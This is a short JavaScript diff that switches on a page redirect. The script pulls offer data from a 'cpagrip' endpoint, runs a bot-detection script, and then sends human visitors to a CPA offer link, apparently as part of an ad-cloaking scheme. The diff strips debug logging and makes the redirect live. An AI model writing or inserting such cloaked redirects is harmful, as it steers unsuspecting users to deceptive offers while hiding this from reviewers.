@@ -3,7 +3,6 @@ var json = 'https://blossombabes.my.id/cpagrip/jsoncpagrip.php';
 var xhttp = new XMLHttpRequest();
 
 function initialize() {
-  console.log("init");
   var script = document.createElement('script');
   script.onload = function () {
     new BotDetector({
@@ -32,8 +31,7 @@ function redirectCPA() {
           item = arr[i];
         }
       }
-      console.log(item.offerlink);
-      //window.location.href = redirectUrl;
+      window.location.href = item.offerlink;
     }
   };
 }
